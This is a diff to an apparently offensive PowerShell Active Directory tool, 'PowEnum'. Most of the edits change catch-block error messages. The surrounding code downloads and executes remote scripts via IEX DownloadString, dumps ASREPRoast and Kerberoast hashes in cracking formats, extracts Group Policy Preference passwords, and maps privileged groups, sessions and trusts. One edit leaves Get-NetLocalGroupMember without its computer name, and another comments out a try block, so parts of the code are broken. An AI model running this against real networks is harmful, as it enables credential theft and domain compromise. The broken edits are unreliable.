@@ -208,7 +208,7 @@ Param(
 			IEX $webclient.DownloadString($ASREPRoastURL)
 			Write-Host "Success" -ForegroundColor Green
 			PowEnum-ASREPRoast
-		}catch {Write-Host "Error" -ForegroundColor Red}
+		}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 		PowEnum-Kerberoast
 		PowEnum-ExcelFile -SpreadsheetName Roasting
 	}
@@ -256,7 +256,7 @@ Param(
 			IEX $webclient.DownloadString($GetGPPPasswordURL)
 			Write-Host "Success" -ForegroundColor Green
 			PowEnum-GPPPassword
-		}catch {Write-Host "Error" -ForegroundColor Red}
+		}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 		PowEnum-SYSVOLFiles	
 		PowEnum-ExcelFile -SpreadsheetName SYSVOL
 	}
@@ -294,7 +294,7 @@ function PowEnum-DCs {
 		Write-Host "[ ]Domain Controllers | " -NoNewLine
 		$temp = Get-DomainController -Domain $FQDN | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
 		PowEnum-ExportAndCount -TypeEnum DCs
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-DAs {
@@ -303,7 +303,7 @@ function PowEnum-DAs {
 		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"DAs"}})
 		PowEnum-ExportAndCount -TypeEnum DAs
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-EAs {
@@ -312,7 +312,7 @@ function PowEnum-EAs {
 		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"EAs"}})
 		PowEnum-ExportAndCount -TypeEnum EAs
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SchemaAdmins {
@@ -321,7 +321,7 @@ function PowEnum-SchemaAdmins {
 		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"SchemaAdmins"}})
 		PowEnum-ExportAndCount -TypeEnum SchemaAdmins
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-AccountOperators {
@@ -330,7 +330,7 @@ function PowEnum-AccountOperators {
 		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"AcctOperators"}})
 		PowEnum-ExportAndCount -TypeEnum AcctOperators
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-BackupOperators {
@@ -339,7 +339,7 @@ function PowEnum-BackupOperators {
 		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BackupOperators"}})
 		PowEnum-ExportAndCount -TypeEnum BackupOperators
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-PrintOperators {
@@ -348,7 +348,7 @@ function PowEnum-PrintOperators {
 		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"PrintOperators"}})
 		PowEnum-ExportAndCount -TypeEnum PrintOperators
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-ServerOperators {
@@ -357,7 +357,7 @@ function PowEnum-ServerOperators {
 		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"ServerOperators"}})
 		PowEnum-ExportAndCount -TypeEnum ServerOperators
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-GPCreatorsOwners {
@@ -366,7 +366,7 @@ function PowEnum-GPCreatorsOwners {
 		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"GPCreatorsOwners"}})
 		PowEnum-ExportAndCount -TypeEnum GPCreatorsOwners
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-CryptographicOperators {
@@ -375,7 +375,7 @@ function PowEnum-CryptographicOperators {
 		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"CryptographicOperators"}})
 		PowEnum-ExportAndCount -TypeEnum CryptographicOperators
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-BltAdmins {
@@ -384,7 +384,7 @@ function PowEnum-BltAdmins {
 		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BltAdmins"}})
 		PowEnum-ExportAndCount -TypeEnum BltAdmins
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Users {
@@ -396,15 +396,18 @@ function PowEnum-Users {
 				$ConvertedGroupNames -join "; "}}, 
 				pwdlastset, admincount, distinguishedname, userprincipalname, serviceprincipalname, useraccountcontrol, iscriticalsystemobject
 		PowEnum-ExportAndCount -TypeEnum Users
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Groups {
 	try {
 		Write-Host "[ ]All Domain Groups (this could take a while) | " -NoNewLine
-		$temp = Get-DomainGroup -Domain $FQDN | Select-Object samaccountname, admincount, description, iscriticalsystemobject
+		$temp = Get-DomainGroup -Domain $FQDN | Select-Object samaccountname, admincount, description, iscriticalsystemobject, 
+			@{N="MemberOf";E={ 
+			$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
+			$ConvertedGroupNames -join "; "}}
 		PowEnum-ExportAndCount -TypeEnum Groups
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Computers {
@@ -415,7 +418,7 @@ function PowEnum-Computers {
 				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
 				$ConvertedGroupNames -join "; "}}
 		PowEnum-ExportAndCount -TypeEnum Computers
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-IPs {
@@ -423,7 +426,7 @@ function PowEnum-IPs {
 		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
 		$temp = Get-DomainComputer -Domain $FQDN | Resolve-IPAddress
 		PowEnum-ExportAndCount -TypeEnum IPs
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-DCLocalAdmins {
@@ -436,7 +439,7 @@ function PowEnum-DCLocalAdmins {
 			$Domain_Controller_Hostname = $_
 			
 			#Get Local Admins On DC using WinNT method because the other method doesnt properly account for the local admin SID being the domain SID
-			$DomainController_LocalAdmin = Get-NetLocalGroupMember -Method WinNT -ComputerName $Domain_Controller_Hostname
+			$DomainController_LocalAdmin = Get-NetLocalGroupMember -Method WinNT -ComputerName 
 			
 			#If the local admin is a group and domain then recursively get all members and add to table
 			$DomainController_LocalAdmin_DomainGroupMembers = $DomainController_LocalAdmin | 
@@ -456,19 +459,21 @@ function PowEnum-DCLocalAdmins {
 					Label = "GroupName"
 					Expression = { if ($_.GroupName) { $_.GroupName } else { "No Data" } }
 			 }
-				
-				
-			$script:Summary += ($DomainController_LocalAdmin_DomainGroupMembers | Select-Object MemberName,MemberDomain,
-				@{N="Source";E={"DCLocalAdmins"}})
 			
 			$DomainController_LocalAdmin += $DomainController_LocalAdmin_DomainGroupMembers |
 				Select-Object ComputerName, GroupName, AccountName, SID, isGroup, isDomain
+			
+			$script:Summary += ($DomainController_LocalAdmin | 
+				Select-Object @{N="MemberName";E={$_.AccountName.Substring($_.AccountName.IndexOf("\")+1)}},
+					@{N="MemberDomain";E={$_.AccountName.Substring(0,$_.AccountName.IndexOf("\"))}},
+					@{N="Source";E={"DCLocalAdmins"}}
+			)
 		
 			$temp += $DomainController_LocalAdmin
 		}
 		
 		PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Subnets {
@@ -476,16 +481,18 @@ function PowEnum-Subnets {
 		Write-Host "[ ]Domain Subnets | " -NoNewLine
 		$temp = Get-DomainSubnet -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum Subnets
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-DNSRecords {
-	try {
+	#try {
 		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
-		$temp = Get-DomainDNSZone -Domain $FQDN
-		if ($temp -ne $null) {$temp = $temp | Get-DomainDNSRecord}
+		$DnsZones = Get-DomainDNSZone -Domain $FQDN
+		if ($DnsZones -ne $null) {
+			$temp = $DnsZones | Get-DomainDNSRecord -ErrorAction SilentlyContinue
+		}
 		PowEnum-ExportAndCount -TypeEnum DNSRecords
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	#}catch {Write-Host ""}
 }
 
 function PowEnum-NetSess {
@@ -493,7 +500,7 @@ function PowEnum-NetSess {
 		Write-Host "[ ]Net Sessions | " -NoNewLine
 		$temp = Get-DomainController -Domain $FQDN | Get-NetSession | ?{$_.UserName -notlike "*$"}
 		PowEnum-ExportAndCount -TypeEnum NetSess
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-WinRM {
@@ -501,7 +508,7 @@ function PowEnum-WinRM {
 		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
 		$temp = Get-DomainComputer -Domain $FQDN -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
 		PowEnum-ExportAndCount -TypeEnum WinRM
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Disabled {
@@ -509,7 +516,7 @@ function PowEnum-Disabled {
 		Write-Host "[ ]Disabled Account | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum Disabled
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-PwNotReq {
@@ -517,7 +524,7 @@ function PowEnum-PwNotReq {
 		Write-Host "[ ]Enabled, Password Not Required | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum PwNotReq
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-PwNotExp {
@@ -525,7 +532,7 @@ function PowEnum-PwNotExp {
 		Write-Host "[ ]Enabled, Password Doesn't Expire | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum PwNotExpire
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-PwNotExpireNotReq {
@@ -533,7 +540,7 @@ function PowEnum-PwNotExpireNotReq {
 		Write-Host "[ ]Enabled, Password Doesn't Expire & Not Required | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum PwNotExpireNotReq
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SmartCardReq {
@@ -541,7 +548,7 @@ function PowEnum-SmartCardReq {
 		Write-Host "[ ]Enabled, Smartcard Required | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReq
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SmartCardReqPwNotReq {
@@ -549,7 +556,7 @@ function PowEnum-SmartCardReqPwNotReq {
 		Write-Host "[ ]Enabled, Smartcard Required, Password Not Required | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotReq
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SmartCardReqPwNotExp {
@@ -557,7 +564,7 @@ function PowEnum-SmartCardReqPwNotExp {
 		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExp
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SmartCardReqPwNotExpNotReq {
@@ -565,7 +572,7 @@ function PowEnum-SmartCardReqPwNotExpNotReq {
 		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire & Not Required | " -NoNewLine
 		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExpNotReq
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-ASREPRoast {
@@ -573,7 +580,7 @@ function PowEnum-ASREPRoast {
 		Write-Host "[ ]ASREProast (John Format) | " -NoNewLine
 		$temp = Invoke-ASREPRoast -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum ASREPRoast
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-Kerberoast {
@@ -581,7 +588,7 @@ function PowEnum-Kerberoast {
 		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
 		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $FQDN -WarningAction silentlyContinue
 		PowEnum-ExportAndCount -TypeEnum Kerberoast
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-GPPPassword {
@@ -589,7 +596,7 @@ function PowEnum-GPPPassword {
 		Write-Host "[ ]GPP Password(s) | " -NoNewLine
 		$temp = Get-GPPPassword -Server $FQDN
 		PowEnum-ExportAndCount -TypeEnum GPPPassword
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-SYSVOLFiles {
@@ -597,7 +604,7 @@ function PowEnum-SYSVOLFiles {
 		Write-Host "[ ]Potential logon scripts on \\$FQDN\SYSVOL | " -NoNewLine
 		$temp = Find-InterestingFile -Path \\$FQDN\sysvol -Include @('*.vbs', '*.bat', '*.ps1', '.cmd') -Verbose
 		PowEnum-ExportAndCount -TypeEnum SYSVOLFiles
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-GroupManagers {
@@ -605,15 +612,15 @@ function PowEnum-GroupManagers {
 		Write-Host "[ ]AD Group Managers | " -NoNewLine
 		$temp = Get-DomainManagedSecurityGroup -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum GroupManagers
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-FileServers {
 	try{
 		Write-Host "[ ]Potential Fileservers | " -NoNewLine
-		$temp = Get-DomainFileServer -Domain $FQDN
+		$temp = Get-DomainFileServer -Domain $FQDN | Select-Object @{Name='FileServerName';Expression={$_}}
 		PowEnum-ExportAndCount -TypeEnum FileServers
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-DomainTrusts {
@@ -621,7 +628,7 @@ function PowEnum-DomainTrusts {
 		Write-Host "[ ]Domain Trusts | " -NoNewLine
 		$temp = Get-DomainTrust -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum DomainTrusts
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-ForeignUsers {
@@ -629,7 +636,7 @@ function PowEnum-ForeignUsers {
 		Write-Host "[ ]Foreign [Domain] Users | " -NoNewLine
 		$temp = Get-DomainForeignUser -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum ForeignUsers
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-ForeignGroupMembers {
@@ -637,7 +644,7 @@ function PowEnum-ForeignGroupMembers {
 		Write-Host "[ ]Foreign [Domain] Group Members | " -NoNewLine
 		$temp = Get-DomainForeignGroupMember -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum ForeignGroupMembers
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-CreateSummary {
@@ -666,7 +673,7 @@ function PowEnum-CreateSummary {
 		
 		$temp = $NewHVTList
 		PowEnum-ExportAndCount -TypeEnum Summary
-	}catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
 }
 
 function PowEnum-ExportAndCount {
